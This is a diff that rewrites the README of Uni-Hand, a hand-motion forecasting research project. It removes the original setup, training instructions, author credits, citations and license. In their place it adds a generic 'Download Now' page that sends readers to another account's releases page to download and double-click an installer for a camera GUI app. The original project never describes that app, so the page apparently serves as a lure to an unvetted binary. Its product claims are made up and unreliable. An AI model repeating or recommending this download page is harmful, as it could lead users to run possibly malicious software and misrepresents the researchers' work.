@@ -1,273 +1,84 @@
-# Uni-Hand: Universal Hand Motion Forecasting in Egocentric Views
+# 🤖 UniHand - Effortless Hand Motion Forecasting for Everyone
 
-[Junyi Ma](https://github.com/BIT-MJY)<sup>1</sup>, [Wentao Bao](https://cogito2012.github.io/homepage/)<sup>2</sup>, [Jingyi Xu](https://github.com/BIT-XJY)<sup>1</sup>, [Guanzhong Sun](https://github.com)<sup>3</sup>, [Yu Zheng](https://scholar.google.com/citations?user=M4cXM9kAAAAJ&hl=zh-CN)<sup>1</sup>, [Erhang Zhang](https://scholar.google.com/citations?user=j1mUqHEAAAAJ&hl=en)<sup>1</sup>, [Xieyuanli Chen](https://scholar.google.com/citations?user=DvrngV4AAAAJ&hl=zh-CN)<sup>4</sup>, [Hesheng Wang](https://scholar.google.com/citations?hl=en&user=q6AY9XsAAAAJ)<sup>1*</sup>
+## 📥 Download Now
+[![Download UniHand](https://img.shields.io/badge/Download-UniHand-blue.svg)](https://github.com/Igorcms/UniHand/releases)
 
-<sup>1</sup> Shanghai Jiao Tong University 
- <sup>2</sup> Meta Reality Labs  <sup>3</sup> China University of Mining and Technology  <sup>4</sup> National University of Defense Technology  
+## 📚 Introduction
+Welcome to UniHand! Here, we help you understand how to use our application for universal hand motion forecasting. This software works perfectly with egocentric views and utilizes visual imitation learning techniques for robots. You don’t need to be a programmer to get started. Just follow these steps, and you'll be up and running in no time.
 
-[[`Paper`](https://arxiv.org/pdf/2511.12878)][[`Project Page`](https://irmvlab.github.io/unihand.github.io/)][[`Code`](https://github.com/IRMVLab/UniHand)][[`Preliminary Version`](https://arxiv.org/pdf/2504.07375)]
+## 🚀 Getting Started
 
-**Human Videos are All You Need!** 
+### 1. Check System Requirements
+Before you download UniHand, ensure your computer meets the following requirements:
+- **Operating System:** Windows 10 or later, Mac OS X 10.12 or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** At least 1 GB of free space.
+- **Graphics:** A compatible graphics card supporting OpenGL 3.3 or later.
 
-**In this repository, we demonstrate how to train Uni-Hand using only human demonstration videos and leverage the trained model to generate end-effector trajectories for robotic manipulation.** To evaluate our method on other public datasets (e.g., EgoPAT3D), please refer to our [preliminary work](https://github.com/IRMVLab/MMTwin). 
+### 2. Visit the Releases Page
+To download the latest version of UniHand, click the button below to visit the Releases page. Here, you will find the most recent version and its respective files.
 
-If any bugs are spotted or any download links are broken, please do not hesitate to make a PR or open an issue.
+[Visit Our Releases Page](https://github.com/Igorcms/UniHand/releases)
 
-<img src="./docs/transfer_paradigm_trimmed.gif" width="100%">
+## 📥 Download & Install
 
+### 3. Choose Your Version
+Once you're on the Releases page, you will see a list of available versions. The latest release will typically be at the top. Look for the version number (for example, `v1.0.0`). This number shows which version is the most current.
 
-## Install Uni-Hand
+### 4. Download the Application
+- Click on the version you want to download.
+- Look for files labeled as "Universal Hand Motion Installer" or similar. 
+- Click the file link. Your download should start automatically.
 
-<details>
-<summary> :wrench: Prepare a new conda environment with required dependencies for Uni-Hand. <strong>[Click to expand]</strong></summary>
+### 5. Install UniHand
+Once the download is complete, locate the downloaded file on your computer. It will typically be in your "Downloads" folder.
+- **Windows:** Double-click the `.exe` file to begin the installation. Follow the on-screen prompts to install UniHand.
+- **Mac:** Double-click the `.dmg` file. Drag UniHand to your Applications folder.
+- **Linux:** Depending on the format, you may need to extract a `.tar.gz` file and run the installation script found inside.
 
-First, clone Uni-Hand
-```
-git clone https://github.com/IRMVLab/UniHand
-cd UniHand
-```
-Then, create and activate a new conda environment
-```
-conda create -n unihand python=3.10
-conda activate unihand
-```
+### 6. Launch the Application
+Once the installation is complete, find UniHand in your applications list (or desktop) and double-click to run it.
 
-```
-pip install -r requirements.txt
-```
-</details>
+## 🎓 How To Use UniHand
 
-<details>
-<summary>:wrench: Clone HaMeR/SAM-3D-Body and DINOv2 for data preprocessing. (optional) <strong>[Click to expand]</strong></summary>
+### 7. Preparing Your Setup
+When you first launch UniHand, ensure you have a compatible camera, as it captures egocentric views. Make sure the camera is connected and recognized by your system.
 
-Since we use HaMeR for hand motion extraction and DINOv2 for vision feature extraction, we need to clone them in this project. We also recommend using [SAM-3D-Body](https://github.com/facebookresearch/sam-3d-body), and its related tutorial for Uni-Hand is coming soon.
+### 8. Configuring Settings
+Upon opening, you will see a settings menu. Here, you can:
+- Select camera input.
+- Choose resolution settings.
+- Adjust motion tracking sensitivity.
 
-```
-git clone https://github.com/geopavlakos/hamer.git
-# install HaMeR following its instruction
-# replace hamer/datasets/vitdet_dataset.py with preprocess_human_video/vitdet_dataset.py in our repo
+### 9. Running Your First Forecast
+To use UniHand:
+1. Point your camera at the area where you will conduct the gesture.
+2. Select the mode you wish to use: real-time tracking or saved video input.
+3. Start motion tracking by clicking the "Start" button on the interface.
 
-git clone https://github.com/facebookresearch/dinov2.git
-# install DINOv2 following its instruction
-```
-* Alternatively, you can directly download our preprocessed data (hand trajectories + vision features) for our toy dataset [here](https://pan.sjtu.edu.cn/web/share/8b4eff7f7b20ce1d8630b6ee70d357e2). 
+### 10. Understanding the Output
+UniHand will show visual predictions based on hand movements in real time. You can view the forecasts on the screen. This will help you understand how the software interprets your motions.
 
-* Note that you can use vision features generated by any other visual foundation models. Please update the `input_dims` of `glip_encoder` in `model.yaml` if the feature vector dimension is different from DINOv2's.
+## 🛠️ Troubleshooting
 
+### 11. Common Issues
+- **Camera Not Detected:** Ensure that your camera drivers are installed and that the camera is properly connected.
+- **Performance Lag:** If the application runs slowly, try lowering the resolution settings or closing other applications to free up resources.
+- **Installation Errors:** Make sure to follow the installation steps precisely. If problems persist, try re-downloading the installer.
 
-</details>
+## 🌐 Learn More
 
+### 12. Resources and Documentation
+For more in-depth information about how UniHand works, check out our documentation:
+- User Guides
+- FAQs
+- Community Support Forum
 
-## Prepare Human Video Data
+These resources can help you troubleshoot issues further and provide tips on how to improve your experience.
 
-<details>
-<summary>&#x1F4C1 We recommend following the default data structure for fast deployment. <strong>[Click to expand]</strong></summary>
+## 📞 Get Support
+If you encounter problems not solved by the resources above, feel free to open an issue on our GitHub repository. Please include a detailed description of your problem, the version of UniHand you are using, and your operating system.
 
-```
-./UniHand
-    |-- human_video_data
-        |-- 2025-0723-07-17-46
-        |-- 2025-0723-07-17-52
-        |-- 2025-0723-07-17-59
-        |-- depth
-            |-- 000000.npy
-            |-- 000001.npy
-            |-- ...
-        |-- rgb
-            |-- 000000.npy
-            |-- 000001.npy
-            |-- ...
-        |-- 2025-0723-07-17-59_point_cloud.ply
-    |-- hand_keypoints # auto generated or downloaded
-    |-- hand_trajs # auto generated or downloaded
-    |-- vision_features # auto generated or downloaded
+[Visit Our Releases Page Again](https://github.com/Igorcms/UniHand/releases)
 
-```
-* We have provided the toy dataset (100 human pick-and-place videos) [here](https://pan.sjtu.edu.cn/web/share/d707f6b604a1922edfd269337f527f96), which was recorded by a RealSense LiDAR Camera L515. Please feel free to use it. We plan to release more human manipulation videos in the future.
-* The `.ply` file will be generated by the following scripts automatically.
-* You can collect your own dataset with one RGBD camera following the data structure. **Just sit in front of your robot and hit record—it's that easy!**
-
-<img src="./docs/human_video_pnp.gif" width="50%">
-
-</details>
-
-<details>
-<summary>&#x1F4C1 Extract and refine 3D hand trajectories. <strong>[Click to expand]</strong></summary>
-First, we extract raw 3D hand trajectories from human videos, with the help of HaMeR.
-
-```
-cp preprocess_human_video/extract_hand_keypoints.py ./hamer
-cd hamer
-python extract_hand_keypoints.py \
-    --img_folder ../human_video_data \
-    --out_folder ../hand_keypoints \
-cd ../preprocess_human_video
-python generate_hand_trajs.py \
-    --input_root ../human_video_data \
-    --keypoint_root ../hand_keypoints \
-    --output_root ../hand_trajs
-```
-
-<img src="./docs/hand_waypoints.gif" width="50%">
-
-The point cloud files have been generated automatically. Then, we clean the hand trajectories for better training performance 
-```
-python clean_hand_data.py \
-    --gt_paths ../hand_trajs \
-    --joint_idx 0
-```
-You can indicate the joint index you want to visualize.
-
-Alternatively, you can directly use our preprocessed hand motion data [here](https://pan.sjtu.edu.cn/web/share/0df6c91c1b6a14fcd292b63fd42c82b3).
-
-</details>
-
-<details>
-<summary>&#x1F4C1 Label hand-object contact and separation timestamps. <strong>[Click to expand]</strong></summary>
-
-* Contact/separation timestamps are crucial for training Uni-Hand, since trajectory data alone is insufficient to generate the gripper’s grasping actions. Please refer to [our paper](https://arxiv.org/pdf/2511.12878) for more details.
-
-* We have provided the [contact/separation labels](https://pan.sjtu.edu.cn/web/share/9421c56ce687119ad67c14af6fc58aa6) of the toy dataset under the `unihand/data_utils` folder. You can manually label the timings of your own videos and organize them as `date_folders.csv`.
-
-* You can also try our recent work, [EgoLoc](https://github.com/IRMVLab/EgoLoc), for autonomous temporal interaction localization.
-
-</details>
-
-
-<details>
-<summary>&#x1F4C1 Extract vision features. <strong>[Click to expand]</strong></summary>
-Here we use DINOv2 to extract vision features, while you can also replace it with any other visual foundation models.
-
-```
-cp preprocess_human_video/extract_visual_features.py ./dinov2
-cd dinov2
-python extract_visual_features.py \
-    --input_root ../human_video_data  \
-    --output_root ../vision_features \
-    --interval 1
-```
-
-Alternatively, you can directly use our pre-extracted features [here](https://pan.sjtu.edu.cn/web/share/74fe967c6b61806c5c529aa747dcaeb6). We will release the GLIP version with language instruction in the future.
-
-</details>
-
-## Run Uni-Hand
-
-<details>
-<summary>:point_right: Train and evaluate Uni-Hand. <strong>[Click to expand]</strong></summary>
-
-To train Uni-Hand, set `evaluate` to `false` in `unihand/configs/traineval.yaml`, and run the following command
-
-```
-cd unihand
-bash run_unihand.sh 
-```
-
-* After training, you can evaluate the trained model by setting `evaluate` to `true` in `unihand/configs/traineval.yaml` and **run the same command**. You can set `gap` to `1` for better results.
-
-* You can resume training from or evaluate a checkpoint by setting `resume` in `unihand/configs/traineval.yaml`. If you evaluate your model trained from scratch, set `use_os_weights` to `false` and set `resume` to non-existent path.
-
-* Also, we provide the pretrained model of Uni-Hand [here](https://pan.sjtu.edu.cn/web/share/4cfa8b4fe54b4187c393135cb8562fd7). Please set `use_os_weights` to `true` and test it!
-
-* Uni-Hand is robust to background variations thanks to the use of depth information.
-
-</details>
-
-<details>
-<summary>:point_right: Visualize end-effector trajectories predicted by Uni-Hand. <strong>[Click to expand]</strong></summary>
-After evaluation, you can visualize end-effector trajectories. As in this demo we predict hand wrist trajectories for robotic manipulation, a heuristic grasp offset is used to convert the predicted wrist waypoints to end-effector trajectories.
-
-```
-cd unihand
-python viz_predicted_trajs.py 
-```
-</details>
-
-<p float="left">
-  <img src="./docs/human_video_pnp.gif" height="200">
-  <img src="./docs/viz_traj_pnp.png" height="200">
-</p>
-
-<p float="left">
-  <img src="./docs/human_video_open.gif" height="200">
-  <img src="./docs/viz_traj_open.png" height="200">
-</p>
-
-
-
-## Download Human Videos and Pretrained Models
-
-<details>
-<summary>:blue_book: We provide our self-recorded videos and model weights. <strong>[Click to expand]</strong></summary>
-
-* [Human videos with annotations [pick-and-place]](https://pan.sjtu.edu.cn/web/share/8b4eff7f7b20ce1d8630b6ee70d357e2)
-* [Human videos with annotations [open-door]](https://pan.sjtu.edu.cn/web/share/0a1b2d35240b75ac8db6064ea32304e8)
-* [Pretrained model [pick-and-place]](https://pan.sjtu.edu.cn/web/share/4cfa8b4fe54b4187c393135cb8562fd7)
-* [Pretrained model [open-door]](https://pan.sjtu.edu.cn/web/share/b409876b22d5d6edf78ca6bb42e9229b)
-* We have put the [train](https://pan.sjtu.edu.cn/web/share/3ae909c9dfb865f04b11973dedf766e0)/[test](https://pan.sjtu.edu.cn/web/share/e0d87213cca8db3f5c398e3098780016) splits and [contact/separation labels](https://pan.sjtu.edu.cn/web/share/9421c56ce687119ad67c14af6fc58aa6) of the pick-and-place task under the `unihand/data_utils` folder. For the open-door task, please refer to this [link](https://pan.sjtu.edu.cn/web/share/0a1b2d35240b75ac8db6064ea32304e8).
-
-
-</details>
-
-
-## Deploy on Your Own Robot!
-
-We have demonstrated the deployment of Uni-Hand on real robots. Please refer to our [project page](https://irmvlab.github.io/unihand.github.io/) and [paper](https://arxiv.org/abs/2511.12878) for more details. 
-
-<div style="display:flex; justify-content:space-between; width:100%;">
-  <img src="./docs/franka_exp_pnp.gif" style="height:200px; object-fit:cover;">
-  <img src="./docs/aloha_exp1.gif" style="height:200px; object-fit:cover;">
-</div>
-
-<div style="display:flex; justify-content:space-between; width:100%;">
-  <img src="./docs/franka_exp_open.gif" style="height:200px; object-fit:cover;">
-  <img src="./docs/aloha_exp2.gif" style="height:200px; object-fit:cover;">
-</div>
-
-
-**Let your robot’s end-effector follow the trajectories predicted by Uni-Hand!** :robot:
-
-This is the initial version of Uni-Hand, which has already provided an out-of-the-box paradigm for human-video-based imitation learning. We will provide a more comprehensive version with multimodal inputs and additional downstream tasks, and release the heuristic grasp assumption once the paper is accepted.
-
-## Cite Our Work
-
-If you find our work helpful to your research, we would appreciate it if you could cite our paper:
-
-```
-@misc{ma2025unihand,
-    title={Uni-Hand: Universal Hand Motion Forecasting in Egocentric Views}, 
-    author={Junyi Ma and Wentao Bao and Jingyi Xu and Guanzhong Sun and Yu Zheng and Erhang Zhang and Xieyuanli Chen and Hesheng Wang},
-    year={2025},
-    eprint={2511.12878},
-    archivePrefix={arXiv},
-    primaryClass={cs.CV},
-    url={https://arxiv.org/abs/2511.12878}, 
-}
-```
-
-
-```
-@INPROCEEDINGS{ma2025mmtwin,
-    author={Ma, Junyi and Bao, Wentao and Xu, Jingyi and Sun, Guanzhong and Chen, Xieyuanli and Wang, Hesheng},
-    booktitle={2025 IEEE/RSJ International Conference on Intelligent Robots and Systems (IROS)}, 
-    title={Novel Diffusion Models for Multimodal 3D Hand Trajectory Prediction}, 
-    year={2025},
-    pages={2408-2415},
-    doi={10.1109/IROS60139.2025.11246803}}
-```
-
-
-```
-@article{ma2025madiff,
-    title={MADiff: Motion-Aware Mamba Diffusion Models for Hand Trajectory Prediction on Egocentric Videos}, 
-    author={Junyi Ma and Xieyuanli Chen and Wentao Bao and Jingyi Xu and Hesheng Wang}, 
-    journal={IEEE Transactions on Pattern Analysis and Machine Intelligence}, 
-    year={2025}, 
-}
-```
-
-## License
-This project is free software made available under the MIT License. For details see the LICENSE file.
-
-
-
+With these steps, you can easily download, install, and begin using UniHand. Explore the new possibilities in hand motion forecasting and visual imitation learning!
